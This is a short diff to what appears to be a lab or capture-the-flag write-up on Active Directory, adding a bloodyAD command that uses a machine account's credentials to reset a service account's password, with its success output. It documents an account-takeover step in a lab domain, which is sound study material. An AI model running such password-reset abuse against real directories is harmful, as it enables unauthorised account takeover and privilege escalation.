@@ -788,5 +788,12 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 Ill add GenericAll
 
 ```python
+bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'itops01$' -p 'paSSword2459' -k set password 'svc_delegate' 'Password123!'
+[+] Password changed successfully!
+```
+
+Then ill change the password of the user
+
+```python
 
 ```
